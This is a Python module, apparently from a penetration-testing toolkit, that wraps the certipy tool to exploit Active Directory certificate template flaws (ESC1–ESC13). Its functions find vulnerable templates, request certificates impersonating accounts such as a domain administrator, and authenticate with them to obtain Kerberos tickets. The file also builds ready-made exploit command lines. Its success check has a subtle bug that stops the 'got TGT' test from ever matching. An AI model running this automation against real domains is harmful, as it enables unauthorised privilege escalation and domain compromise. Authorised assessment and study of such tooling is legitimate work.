"""Certipy Wrapper — exploitation ADCS via certipy (complément adcs_scanner).

Ce wrapper complète le scanner ADCS existant (navmax.ad.adcs_scanner)
en fournissant l'exploitation RÉELLE via le binaire certipy.

Le scanner ADCS détecte les vulnérabilités (ESC1-ESC13) ;
ce wrapper permet de les exploiter concrètement :
  - find_vulnerable_templates : utilise certipy find pour lister les templates vulnérables
  - request_certificate       : certipy req pour demander un certificat abusé
  - authenticate_with_cert    : certipy auth pour s'authentifier avec le certificat

Sécurité : les credentials et certificats ne sont jamais loggés en clair.

Dépendance externe : certipy (pip install certipy-ad)

Usage:
    wrapper = CertipyWrapper()
    findings = await wrapper.find_vulnerable_templates(
        domain="corp.local",
        dc="dc01.corp.local",
        user="user@corp.local",
        password="...",
    )
    for f in findings:
        print(f"{f.vulnerability} - {f.template}")
"""

from __future__ import annotations

import json
import os
import re
import shutil
import tempfile
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path

from ..core.logging import get_logger

logger = get_logger(__name__)


# ── Modèles de données ─────────────────────────────────────────


@dataclass
class CertipyFinding:
    """Vulnérabilité ADCS trouvée par certipy.

    Attributes:
        vulnerability: Identifiant ESCx (ESC1, ESC2, etc.).
        template: Nom du template vulnérable.
        ca: Nom de la CA.
        description: Description de la vulnérabilité.
        command: Commande certipy recommandée pour exploitation.
    """

    vulnerability: str
    template: str
    ca: str
    description: str = ""
    command: str = ""


@dataclass
class CertipyCertInfo:
    """Informations sur un certificat obtenu via certipy req.

    Attributes:
        cert_file: Chemin vers le fichier .crt.
        key_file: Chemin vers le fichier .key.
        pfx_file: Chemin vers le fichier .pfx.
        template: Template utilisé.
        upn: UPN dans le certificat.
        sid: SID du compte (si disponible).
    """

    cert_file: str = ""
    key_file: str = ""
    pfx_file: str = ""
    template: str = ""
    upn: str = ""
    sid: str = ""


class CertipyWrapper:
    """Wrapper pour certipy — exploitation ADCS.

    Complète le scanner ADCS existant en fournissant l'exploitation
    réelle via le binaire certipy.

    Les méthodes sont indépendantes du scanner ADCS et peuvent être
    utilisées directement ou en complément des résultats du scanner.
    """

    def __init__(self, certipy_path: str | None = None) -> None:
        self._certipy_path = certipy_path or shutil.which("certipy") or "certipy"
        self._available: bool | None = None

    @property
    def available(self) -> bool:
        """Vérifie si certipy est installé."""
        if self._available is not None:
            return self._available
        self._available = shutil.which(self._certipy_path) is not None
        return self._available

    def check_installation(self) -> str:
        """Retourne l'état d'installation de certipy."""
        if self.available:
            return f"certipy est installé : {shutil.which(self._certipy_path)}"
        return (
            "certipy n'est pas installé.\n"
            "  pip install certipy-ad\n"
            "  (nécessite impacket et pycryptodome — déjà présents dans navmax)"
        )

    # ══════════════════════════════════════════════════════════════
    # certipy find
    # ══════════════════════════════════════════════════════════════

    async def find_vulnerable_templates(
        self,
        domain: str,
        dc: str,
        user: str,
        password: str,
        **extra_args: str,
    ) -> list[CertipyFinding]:
        """Lance certipy find pour découvrir les templates vulnérables.

        Équivalent de :
            certipy find -u user@domain -p 'password' -dc-ip dc_ip

        Args:
            domain: Nom de domaine (ex: corp.local).
            dc: IP ou hostname du contrôleur de domaine.
            user: UPN (ex: user@corp.local).
            password: Mot de passe.
            **extra_args: Arguments supplémentaires pour certipy.

        Returns:
            Liste de CertipyFinding avec les vulnérabilités trouvées.
        """
        import asyncio
        import json

        if not self.available:
            msg = "certipy n'est pas installé"
            logger.error("certipy_unavailable", error=msg)
            return []

        # Créer un répertoire temporaire pour la sortie
        output_dir = tempfile.mkdtemp(prefix="certipy_find_")

        try:
            args = [
                self._certipy_path,
                "find",
                "-u",
                user,
                "-p",
                password,
                "-dc-ip",
                dc,
                "-output-directory",
                output_dir,
                "-json",
            ]

            # Ajouter les arguments supplémentaires
            for key, value in extra_args.items():
                opt = f"-{key.replace('_', '-')}"
                args.extend([opt, str(value)])

            logger.info(
                "certipy_find_start",
                domain=domain,
                dc=dc,
                user=user,
            )

            proc = await asyncio.create_subprocess_exec(
                *args,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(
                proc.communicate(),
                timeout=300,
            )

            stdout_str = stdout.decode("utf-8", errors="replace")
            stderr_str = stderr.decode("utf-8", errors="replace")

            if proc.returncode != 0:
                logger.error(
                    "certipy_find_error",
                    returncode=proc.returncode,
                    stderr=stderr_str[:500],
                )
                return []

            # Parser les fichiers JSON générés par certipy find
            findings = self._parse_certipy_find_output(output_dir)

            logger.info(
                "certipy_find_complete",
                domain=domain,
                findings=len(findings),
            )

            return findings

        except asyncio.TimeoutError:
            logger.error("certipy_find_timeout", domain=domain)
            return []
        except Exception as exc:
            logger.exception("certipy_find_exception", error=str(exc))
            return []
        finally:
            # Nettoyer le répertoire temporaire
            self._cleanup_dir(output_dir)

    def _parse_certipy_find_output(self, output_dir: str) -> list[CertipyFinding]:
        """Parse les fichiers JSON produits par certipy find.

        certipy find --json génère un fichier <domain>.json contenant
        la liste des CA, templates, et vulnérabilités.

        Args:
            output_dir: Répertoire de sortie certipy.

        Returns:
            Liste de CertipyFinding.
        """
        findings: list[CertipyFinding] = []
        output_path = Path(output_dir)

        # Chercher les fichiers JSON
        for json_file in output_path.glob("*.json"):
            try:
                with open(json_file, encoding="utf-8", errors="replace") as f:
                    data = json.load(f)
            except (json.JSONDecodeError, OSError):
                continue

            # Structure certipy: {"Certificate Authorities": [...], ...}
            cas = data.get("Certificate Authorities", [])

            for ca_data in cas:
                ca_name = ca_data.get("CA Name", "")
                templates = ca_data.get("Templates", [])

                for tmpl in templates:
                    template_name = tmpl.get("Template Name", "")
                    vulnerabilities = tmpl.get("Vulnerabilities", [])

                    for vuln in vulnerabilities:
                        esc_id = self._classify_vulnerability(vuln)
                        if esc_id:
                            finding = CertipyFinding(
                                vulnerability=esc_id,
                                template=template_name,
                                ca=ca_name,
                                description=vuln,
                                command=self._build_exploit_command(
                                    esc_id,
                                    template_name,
                                    ca_name,
                                ),
                            )
                            findings.append(finding)

        return findings

    def _classify_vulnerability(self, description: str) -> str:
        """Classe une vulnérabilité en ESCx.

        Args:
            description: Description de la vulnérabilité.

        Returns:
            Identifiant ESCx ou chaîne vide si inconnu.
        """
        desc_lower = description.lower()

        mapping: list[tuple[str, str]] = [
            # ESC1: enrollee supplies subject + client auth
            (r"enrollee supplies subject", "ESC1"),
            (r"client authentication", "ESC1"),
            # ESC2: any purpose EKU
            (r"any purpose", "ESC2"),
            # ESC3: enrollment agent
            (r"enrollment agent", "ESC3"),
            (r"certificate request agent", "ESC3"),
            # ESC4: ACL faible
            (r"weak acl|write permission|full control", "ESC4"),
            # ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2
            (r"editf_attributesubjectaltname2", "ESC6"),
            # ESC8: NTLM relay
            (r"ntlm relay|http.*enrollment", "ESC8"),
            # ESC9: no security extension
            (r"no security extension", "ESC9"),
            # ESC10: weak certificate mapping
            (r"weak.*mapping|certificate mapping", "ESC10"),
            # ESC13: OID group link
            (r"oid.*group|group link", "ESC13"),
        ]

        for pattern, esc_id in mapping:
            if re.search(pattern, desc_lower):
                return esc_id

        return ""

    def _build_exploit_command(
        self,
        esc_id: str,
        template: str,
        ca: str,
    ) -> str:
        """Construit la commande certipy recommandée pour l'exploitation.

        Args:
            esc_id: Identifiant ESCx.
            template: Nom du template.
            ca: Nom de la CA.

        Returns:
            Commande certipy d'exploitation.
        """
        commands = {
            "ESC1": f"certipy req -u USER@DOMAIN -p 'PASSWORD' -ca '{ca}' -template '{template}' -upn 'ADMIN@DOMAIN'",
            "ESC2": f"certipy req -u USER@DOMAIN -p 'PASSWORD' -ca '{ca}' -template '{template}'",
            "ESC3": f"certipy req -u USER@DOMAIN -p 'PASSWORD' -ca '{ca}' -template '{template}'",
            "ESC4": f"certipy req -u USER@DOMAIN -p 'PASSWORD' -ca '{ca}' -template '{template}' -upn 'ADMIN@DOMAIN'",
            "ESC6": f"certipy req -u USER@DOMAIN -p 'PASSWORD' -ca '{ca}' -template '{template}' -upn 'ADMIN@DOMAIN'",
            "ESC8": f"certipy relay -ca '{ca}' -template '{template}'",
            "ESC9": f"certipy req -u USER@DOMAIN -p 'PASSWORD' -ca '{ca}' -template '{template}' -upn 'ADMIN@DOMAIN'",
            "ESC13": f"certipy req -u USER@DOMAIN -p 'PASSWORD' -ca '{ca}' -template '{template}'",
        }
        return commands.get(esc_id, "Voir documentation certipy")

    # ══════════════════════════════════════════════════════════════
    # certipy req
    # ══════════════════════════════════════════════════════════════

    async def request_certificate(
        self,
        template: str,
        ca: str,
        user: str,
        upn: str | None = None,
        password: str | None = None,
        dc: str | None = None,
        domain: str | None = None,
        pfx_path: str | None = None,
        **extra_args: str,
    ) -> CertipyCertInfo | None:
        """Demande un certificat via certipy req.

        Équivalent de :
            certipy req -u user@domain -p 'password' -ca 'CA_NAME'
                       -template 'TEMPLATE' -upn 'TARGET_UPN'

        Args:
            template: Nom du template de certificat.
            ca: Nom de la CA.
            user: Compte pour l'authentification (UPN).
            upn: UPN cible pour l'usurpation (ESC1, ESC6, ESC9).
            password: Mot de passe.
            dc: IP/hostname du DC.
            domain: Nom de domaine.
            pfx_path: Chemin pour sauvegarder le .pfx (auto si None).
            **extra_args: Arguments supplémentaires.

        Returns:
            CertipyCertInfo si réussi, None sinon.
        """
        import asyncio

        if not self.available:
            logger.error("certipy_unavailable")
            return None

        # Répertoire de sortie pour certipy
        output_dir = tempfile.mkdtemp(prefix="certipy_req_")

        try:
            args = [
                self._certipy_path,
                "req",
                "-u",
                user,
                "-ca",
                ca,
                "-template",
                template,
            ]

            if password:
                args.extend(["-p", password])
            if upn:
                args.extend(["-upn", upn])
            if dc:
                args.extend(["-dc-ip", dc])
            if domain:
                args.extend(["-domain", domain])

            # Ajouter les arguments supplémentaires
            for key, value in extra_args.items():
                opt = f"-{key.replace('_', '-')}"
                args.extend([opt, str(value)])

            logger.info(
                "certipy_req_start",
                template=template,
                ca=ca,
                user=user,
                upn=upn,
            )

            proc = await asyncio.create_subprocess_exec(
                *args,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                cwd=output_dir,
            )
            stdout, stderr = await asyncio.wait_for(
                proc.communicate(),
                timeout=120,
            )

            stdout_str = stdout.decode("utf-8", errors="replace")
            stderr_str = stderr.decode("utf-8", errors="replace")

            if proc.returncode != 0:
                logger.error(
                    "certipy_req_error",
                    returncode=proc.returncode,
                    error=stderr_str[:500],
                )
                return None

            # Trouver les fichiers générés (.crt, .key, .pfx)
            cert_info = self._find_cert_files(output_dir, template)

            if cert_info:
                logger.info(
                    "certipy_req_success",
                    template=template,
                    cert_file=cert_info.cert_file,
                )

            return cert_info

        except asyncio.TimeoutError:
            logger.error("certipy_req_timeout")
            return None
        except Exception as exc:
            logger.exception("certipy_req_exception", error=str(exc))
            return None
        finally:
            # On ne nettoie PAS le répertoire car il contient les certificats
            pass

    def _find_cert_files(self, output_dir: str, template: str) -> CertipyCertInfo | None:
        """Trouve les fichiers de certificat générés par certipy.

        Args:
            output_dir: Répertoire de sortie.
            template: Nom du template (utilisé dans le nom de fichier).

        Returns:
            CertipyCertInfo avec les chemins.
        """
        cert_info = CertipyCertInfo(template=template)
        out_path = Path(output_dir)

        # Chercher .pfx, .crt, .key
        pfx_files = list(out_path.glob("*.pfx"))
        crt_files = list(out_path.glob("*.crt"))
        key_files = list(out_path.glob("*.key"))

        if pfx_files:
            cert_info.pfx_file = str(pfx_files[0])
        if crt_files:
            cert_info.cert_file = str(crt_files[0])
        if key_files:
            cert_info.key_file = str(key_files[0])

        # Extraire l'UPN du nom du fichier PFX
        if cert_info.pfx_file:
            pfx_name = Path(cert_info.pfx_file).stem
            # Format: <template>_<upn>.pfx  ou  <user>_<template>.pfx
            parts = pfx_name.split("_")
            if len(parts) >= 2:
                # Le dernier segment contient souvent l'UPN/SID
                cert_info.upn = parts[-1]

        if not pfx_files and not crt_files:
            return None

        return cert_info

    # ══════════════════════════════════════════════════════════════
    # certipy auth
    # ══════════════════════════════════════════════════════════════

    async def authenticate_with_cert(
        self,
        cert_file: str,
        key_file: str | None = None,
        pfx_file: str | None = None,
        dc: str | None = None,
        domain: str | None = None,
        **extra_args: str,
    ) -> bool:
        """Authentifie avec un certificat via certipy auth.

        Équivalent de :
            certipy auth -pfx cert.pfx -dc-ip dc_ip

        Args:
            cert_file: Fichier .crt ou .pfx.
            key_file: Fichier .key (optionnel si PFX).
            pfx_file: Fichier .pfx (alternative à cert+key).
            dc: IP/hostname du DC.
            domain: Nom de domaine.
            **extra_args: Arguments supplémentaires.

        Returns:
            True si l'authentification a réussi.
        """
        import asyncio

        if not self.available:
            logger.error("certipy_unavailable")
            return False

        try:
            args = [
                self._certipy_path,
                "auth",
            ]

            # Utiliser PFX si disponible, sinon cert+key
            if pfx_file and os.path.isfile(pfx_file):
                args.extend(["-pfx", pfx_file])
            elif cert_file and key_file and os.path.isfile(cert_file) and os.path.isfile(key_file):
                args.extend(["-cert", cert_file, "-key", key_file])
            else:
                logger.error("certipy_auth_no_credentials")
                return False

            if dc:
                args.extend(["-dc-ip", dc])
            if domain:
                args.extend(["-domain", domain])

            # Ajouter les arguments supplémentaires
            for key, value in extra_args.items():
                opt = f"-{key.replace('_', '-')}"
                args.extend([opt, str(value)])

            logger.info("certipy_auth_start")

            proc = await asyncio.create_subprocess_exec(
                *args,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(
                proc.communicate(),
                timeout=120,
            )

            stdout_str = stdout.decode("utf-8", errors="replace")
            stderr_str = stderr.decode("utf-8", errors="replace")

            if proc.returncode != 0:
                logger.error(
                    "certipy_auth_error",
                    returncode=proc.returncode,
                    error=stderr_str[:500],
                )
                return False

            success = "got TGT" in stdout_str.lower() or "kerberos" in stdout_str.lower()
            if success:
                logger.info("certipy_auth_success")
            else:
                logger.warning("certipy_auth_no_tgt")

            return success

        except asyncio.TimeoutError:
            logger.error("certipy_auth_timeout")
            return False
        except Exception as exc:
            logger.exception("certipy_auth_exception", error=str(exc))
            return False

    # ══════════════════════════════════════════════════════════════
    # Utilitaires
    # ══════════════════════════════════════════════════════════════

    @staticmethod
    def _cleanup_dir(path: str) -> None:
        """Supprime un répertoire et son contenu.

        Args:
            path: Chemin du répertoire.
        """
        import shutil

        try:
            if os.path.isdir(path):
                shutil.rmtree(path, ignore_errors=True)
        except Exception:
            pass
